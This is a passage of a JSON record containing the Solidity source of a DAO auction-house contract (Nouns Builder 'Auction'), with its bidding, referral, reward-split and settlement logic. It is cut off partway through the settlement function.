      "content": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.16;\n\nimport { UUPS } from \"../lib/proxy/UUPS.sol\";\nimport { Ownable } from \"../lib/utils/Ownable.sol\";\nimport { ReentrancyGuard } from \"../lib/utils/ReentrancyGuard.sol\";\nimport { Pausable } from \"../lib/utils/Pausable.sol\";\nimport { SafeCast } from \"../lib/utils/SafeCast.sol\";\n\nimport { AuctionStorageV1 } from \"./storage/AuctionStorageV1.sol\";\nimport { Token } from \"../token/Token.sol\";\nimport { AuctionStorageV2 } from \"./storage/AuctionStorageV2.sol\";\nimport { Manager } from \"../manager/Manager.sol\";\nimport { IAuction } from \"./IAuction.sol\";\nimport { IWETH } from \"../lib/interfaces/IWETH.sol\";\nimport { IProtocolRewards } from \"../lib/interfaces/IProtocolRewards.sol\";\n\nimport { VersionedContract } from \"../VersionedContract.sol\";\n\n/// @title Auction\n/// @author Rohan Kulkarni & Neokry\n/// @notice A DAO's auction house\n/// @custom:repo github.com/ourzora/nouns-protocol\n/// Modified from:\n/// - NounsAuctionHouse.sol commit 2cbe6c7 - licensed under the BSD-3-Clause license.\n/// - Zora V3 ReserveAuctionCoreEth module commit 795aeca - licensed under the GPL-3.0 license.\ncontract Auction is IAuction, VersionedContract, UUPS, Ownable, ReentrancyGuard, Pausable, AuctionStorageV1, AuctionStorageV2 {\n    ///                                                          ///\n    ///                          CONSTANTS                       ///\n    ///                                                          ///\n\n    /// @notice The basis points for 100%\n    uint256 private constant BPS_PER_100_PERCENT = 10_000;\n\n    /// @notice The maximum rewards percentage\n    uint256 private constant MAX_FOUNDER_REWARD_BPS = 3_000;\n\n    ///                                                          ///\n    ///                          IMMUTABLES                      ///\n    ///                                                          ///\n\n    /// @notice Iniital time buffer for auction bids\n    uint40 private immutable INITIAL_TIME_BUFFER = 5 minutes;\n\n    /// @notice Min bid increment BPS\n    uint8 private immutable INITIAL_MIN_BID_INCREMENT_PERCENT = 10;\n\n    /// @notice The address of WETH\n    address private immutable WETH;\n\n    /// @notice The contract upgrade manager\n    Manager private immutable manager;\n\n    /// @notice The rewards manager\n    IProtocolRewards private immutable rewardsManager;\n\n    /// @notice The builder reward BPS as a percent of settled auction amount\n    uint16 public immutable builderRewardsBPS;\n\n    /// @notice The referral reward BPS as a percent of settled auction amount\n    uint16 public immutable referralRewardsBPS;\n\n    ///                                                          ///\n    ///                          CONSTRUCTOR                     ///\n    ///                                                          ///\n\n    /// @param _manager The contract upgrade manager address\n    /// @param _rewardsManager The protocol rewards manager address\n    /// @param _weth The address of WETH\n    constructor(\n        address _manager,\n        address _rewardsManager,\n        address _weth,\n        uint16 _builderRewardsBPS,\n        uint16 _referralRewardsBPS\n    ) payable initializer {\n        manager = Manager(_manager);\n        rewardsManager = IProtocolRewards(_rewardsManager);\n        WETH = _weth;\n        builderRewardsBPS = _builderRewardsBPS;\n        referralRewardsBPS = _referralRewardsBPS;\n    }\n\n    ///                                                          ///\n    ///                          INITIALIZER                     ///\n    ///                                                          ///\n\n    /// @notice Initializes a DAO's auction contract\n    /// @param _token The ERC-721 token address\n    /// @param _founder The founder responsible for starting the first auction\n    /// @param _treasury The treasury address where ETH will be sent\n    /// @param _duration The duration of each auction\n    /// @param _reservePrice The reserve price of each auction\n    /// @param _founderRewardRecipient The address to recieve founders rewards\n    /// @param _founderRewardBps The percent of rewards a founder receives in BPS for each auction\n    function initialize(\n        address _token,\n        address _founder,\n        address _treasury,\n        uint256 _duration,\n        uint256 _reservePrice,\n        address _founderRewardRecipient,\n        uint16 _founderRewardBps\n    ) external initializer {\n        // Ensure the caller is the contract manager\n        if (msg.sender != address(manager)) revert ONLY_MANAGER();\n\n        // Ensure the founder reward is not more than max\n        if (_founderRewardBps > MAX_FOUNDER_REWARD_BPS) revert INVALID_REWARDS_BPS();\n\n        // Ensure the recipient is set if the reward is greater than 0\n        if (_founderRewardBps > 0 && _founderRewardRecipient == address(0)) revert INVALID_REWARDS_RECIPIENT();\n\n        // Initialize the reentrancy guard\n        __ReentrancyGuard_init();\n\n        // Grant initial ownership to a founder\n        __Ownable_init(_founder);\n\n        // Pause the contract until the first auction\n        __Pausable_init(true);\n\n        // Store DAO's ERC-721 token\n        token = Token(_token);\n\n        // Store the auction house settings\n        settings.duration = SafeCast.toUint40(_duration);\n        settings.reservePrice = _reservePrice;\n        settings.treasury = _treasury;\n        settings.timeBuffer = INITIAL_TIME_BUFFER;\n        settings.minBidIncrement = INITIAL_MIN_BID_INCREMENT_PERCENT;\n\n        // Store the founder rewards settings\n        founderReward.recipient = _founderRewardRecipient;\n        founderReward.percentBps = _founderRewardBps;\n    }\n\n    ///                                                          ///\n    ///                          CREATE BID                      ///\n    ///                                                          ///\n\n    /// @notice Creates a bid for the current token\n    /// @param _tokenId The ERC-721 token id\n    function createBidWithReferral(uint256 _tokenId, address _referral) external payable nonReentrant {\n        currentBidReferral = _referral;\n        _createBid(_tokenId);\n    }\n\n    /// @notice Creates a bid for the current token\n    /// @param _tokenId The ERC-721 token id\n    function createBid(uint256 _tokenId) external payable nonReentrant {\n        currentBidReferral = address(0);\n        _createBid(_tokenId);\n    }\n\n    /// @notice Creates a bid for the current token\n    /// @param _tokenId The ERC-721 token id\n    function _createBid(uint256 _tokenId) private {\n        // Ensure the bid is for the current token\n        if (auction.tokenId != _tokenId) {\n            revert INVALID_TOKEN_ID();\n        }\n\n        // Ensure the auction is still active\n        if (block.timestamp >= auction.endTime) {\n            revert AUCTION_OVER();\n        }\n\n        // Cache the amount of ETH attached\n        uint256 msgValue = msg.value;\n\n        // Cache the address of the highest bidder\n        address lastHighestBidder = auction.highestBidder;\n\n        // Cache the last highest bid\n        uint256 lastHighestBid = auction.highestBid;\n\n        // Store the new highest bid\n        auction.highestBid = msgValue;\n\n        // Store the new highest bidder\n        auction.highestBidder = msg.sender;\n\n        // Used to store whether to extend the auction\n        bool extend;\n\n        // Cannot underflow as `_auction.endTime` is ensured to be greater than the current time above\n        unchecked {\n            // Compute whether the time remaining is less than the buffer\n            extend = (auction.endTime - block.timestamp) < settings.timeBuffer;\n\n            // If the auction should be extended\n            if (extend) {\n                // Update the end time with the additional time buffer\n                auction.endTime = uint40(block.timestamp + settings.timeBuffer);\n            }\n        }\n\n        // If this is the first bid:\n        if (lastHighestBidder == address(0)) {\n            // Ensure the bid meets the reserve price\n            if (msgValue < settings.reservePrice) {\n                revert RESERVE_PRICE_NOT_MET();\n            }\n\n            // Else this is a subsequent bid:\n        } else {\n            // Used to store the minimum bid required\n            uint256 minBid;\n\n            // Cannot realistically overflow\n            unchecked {\n                // Compute the minimum bid\n                minBid = lastHighestBid + ((lastHighestBid * settings.minBidIncrement) / 100);\n            }\n\n            // Ensure the incoming bid meets the minimum\n            if (msgValue < minBid) {\n                revert MINIMUM_BID_NOT_MET();\n            }\n            // Ensure that the second bid is not also zero\n            if (minBid == 0 && msgValue == 0 && lastHighestBidder != address(0)) {\n                revert MINIMUM_BID_NOT_MET();\n            }\n\n            // Refund the previous bidder\n            _handleOutgoingTransfer(lastHighestBidder, lastHighestBid);\n        }\n\n        emit AuctionBid(_tokenId, msg.sender, msgValue, extend, auction.endTime);\n    }\n\n    ///                                                          ///\n    ///                    SETTLE & CREATE AUCTION               ///\n    ///                                                          ///\n\n    /// @notice Settles the current auction and creates the next one\n    function settleCurrentAndCreateNewAuction() external nonReentrant whenNotPaused {\n        _settleAuction();\n        _createAuction();\n    }\n\n    /// @dev Settles the current auction\n    function _settleAuction() private {\n        // Get a copy of the current auction\n        Auction memory _auction = auction;\n\n        // Ensure the auction wasn't already settled\n        if (auction.settled) revert AUCTION_SETTLED();\n\n        // Ensure the auction had started\n        if (_auction.startTime == 0) revert AUCTION_NOT_STARTED();\n\n        // Ensure the auction is over\n        if (block.timestamp < _auction.endTime) revert AUCTION_ACTIVE();\n\n        // Mark the auction as settled\n        auction.settled = true;\n\n        // If a bid was placed:\n        if (_auction.highestBidder != address(0)) {\n            // Cache the amount of the highest bid\n            uint256 highestBid = _auction.highestBid;\n\n            // If the highest bid included ETH: Pay rewards and transfer remaining amount to the DAO treasury\n            if (highestBid != 0) {\n                // Calculate rewards\n                RewardSplits memory split = _computeTotalRewards(currentBidReferral, highestBid, founderReward.percentBps);\n\n                if (split.totalRewards != 0) {\n                    // Deposit rewards\n                    rewardsManager.depositBatch{ value: split.totalRewards }(split.recipients, split.amounts, split.reasons, \"\");\n                }\n\n                // Deposit remaining amount to treasury\n                _handleOutgoingTransfer(settings.treasury, highestBid - split.totalRewards);\n            }\n\n            // Transfer the token to the highest bidder\n            token.transferFrom(address(this), _auction.highestBidder, _auction.tokenId);\n\n            // Else no bid was placed:\n        } else {\n            // Burn the token"
    }
  ]
}